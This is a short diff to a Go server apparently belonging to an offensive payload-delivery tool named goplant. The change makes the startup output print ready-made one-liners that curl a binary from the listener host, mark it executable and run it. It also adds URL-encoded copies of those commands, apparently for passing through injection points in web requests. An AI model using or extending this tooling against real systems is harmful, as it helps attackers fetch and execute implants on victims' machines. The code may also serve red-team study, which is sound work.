@@ -3,14 +3,16 @@ package server
 import (
 	"encoding/base64"
 	"fmt"
-	"github.com/CamilleGR/goplant/internal/builder"
-	"github.com/CamilleGR/goplant/internal/template"
 	"math/rand"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
 	"time"
+
+	"github.com/CamilleGR/goplant/internal/builder"
+	"github.com/CamilleGR/goplant/internal/template"
 )
 
 var plants = []string{
@@ -69,8 +71,13 @@ func (s *Server) Start() error {
 	// fmt.Printf("   - Listener: %s:%s\\n", s.lhost, s.lport)
 	// fmt.Printf("   - Platform: %s/%s\\n", s.targetOS, s.arch)
 	fmt.Printf("\n\n🪴 Payloads : \n")
-	fmt.Printf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
-	fmt.Printf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+	curlLine := fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
+	curlAndExecLine := fmt.Sprintf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+	fmt.Print(curlLine)
+	fmt.Print(curlAndExecLine)
+	fmt.Print("Url encoded : \n")
+	fmt.Print(url.QueryEscape(curlLine) + "\n")
+	fmt.Print(url.QueryEscape(curlAndExecLine) + "\n")
 	fmt.Printf("\n")
 
 	return s.httpServer.ListenAndServe()
